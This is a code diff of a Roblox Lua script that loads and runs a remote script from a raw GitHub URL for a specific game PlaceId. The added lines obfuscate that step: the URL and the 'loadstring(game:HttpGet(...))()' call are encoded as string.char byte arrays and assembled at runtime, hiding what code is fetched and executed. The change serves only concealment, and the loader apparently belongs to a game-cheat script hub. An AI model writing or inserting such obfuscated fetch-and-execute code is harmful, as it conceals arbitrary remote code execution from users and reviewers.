@@ -1,18 +1,11 @@
-
 local placeId = game.PlaceId
 
 if placeId == 98800969324557 then
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/gemIDN/gemScript/refs/heads/main/StorageHunters.lua"))()
-
-elseif placeId == 22222222 then 
-    loadstring(game:HttpGet(""))()
-
-elseif placeId == 33333333 then 
-    loadstring(game:HttpGet(""))()
-
-elseif placeId == 44444444 then -- 
-    loadstring(game:HttpGet(""))()
-
-else
-     
-
+    
+    local _0xURL1 = string.char(104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,103,101,109,73,68,78,47,103,101,109,83,99,114,105,112,116,47,114,101,102,115,47,104,101,97,100,115,47,109,97,105,110,47,83,116,111,114,97,103,101,72,117,110,116,101,114,115,46,108,117,97)
+    local _0xRun1 = string.char(108,111,97,100,115,116,114,105,110,103,40,103,97,109,101,58,72,116,116,112,71,101,116,40,46,46,46,41,41,40,41)
+    
+    
+    local _0xExec1 = loadstring(_0xRun1:gsub("%.%.%.", string.format('"%s"', _0xURL1)))
+    if _0xExec1 then _0xExec1() end
+end
